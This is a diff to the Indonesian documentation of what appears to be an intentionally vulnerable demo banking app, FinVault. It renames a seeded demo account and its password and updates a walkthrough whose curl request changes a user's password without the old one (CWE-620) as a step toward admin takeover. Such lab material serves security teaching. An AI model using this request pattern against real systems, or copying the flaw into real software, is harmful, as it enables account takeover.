@@ -74,7 +74,7 @@ Saat inisialisasi pertama kali atau ketika `POST /api/admin/reset-demo` dipanggi
 | :---: | :--- | :--- | :--- | :--- | :--- | ---: | :--- |
 | 1 | `admin` | `AdminVault#2026` | Admin FinVault | `admin@finvault.local` | `8800-0001-99` | Rp 250.000.000 | `admin` |
 | 2 | `danish` | `DanishPass123` | Danish Al Fayyadh | `danish@finvault.local` | `8800-1024-01` | Rp 12.500.000 | `customer` |
-| 3 | `budi` | `BudiWallet123` | Budi Santoso | `budi@finvault.local` | `8800-1024-02` | Rp 4.750.000 | `customer` |
+| 3 | `raihan` | `rehanwangsaf67` | Raihan Muhammad | `raihan@finvault.local` | `8800-1024-02` | Rp 4.750.000 | `customer` |
 | 4 | `siti` | `SitiSecure123` | Siti Rahmawati | `siti@finvault.local` | `8800-1024-03` | Rp 19.200.000 | `customer` |
 
 ## 3. Struktur Direktori Proyek
@@ -193,9 +193,9 @@ Hasil pemindaian akan mengungkap path `/api`, `/api/users`, `/api/transactions`,
    ```
    Server merespons `200 OK` berisi daftar seluruh nasabah, saldo, nomor rekening, dan keberadaan akun `username: "admin"` (`role: "admin"`).
 2. **Insecure Change Password Feature (Standalone CWE-620)**:
-   Login sebagai akun biasa (misalnya `budi` / `BudiWallet123`), lalu kirim permintaan ganti password tanpa `oldPassword` lewat form atau `curl`/`x-www-form-urlencoded`:
+   Login sebagai akun biasa (misalnya `raihan` / `rehanwangsaf67`), lalu kirim permintaan ganti password tanpa `oldPassword` lewat form atau `curl`/`x-www-form-urlencoded`:
    ```bash
-   curl -X POST http://127.0.0.1:5000/api/change-password -H "Content-Type: application/json" -d "{\"username\":\"budi\",\"newPassword\":\"BudiBaru123\",\"confirmPassword\":\"BudiBaru123\"}"
+   curl -X POST http://127.0.0.1:5000/api/change-password -H "Content-Type: application/json" -d "{\"username\":\"raihan\",\"newPassword\":\"RaihanBaru123\",\"confirmPassword\":\"RaihanBaru123\"}"
    ```
    Server merespons `200 OK` tanpa pernah meminta password lama.
 3. **Chained Admin Account Takeover**:
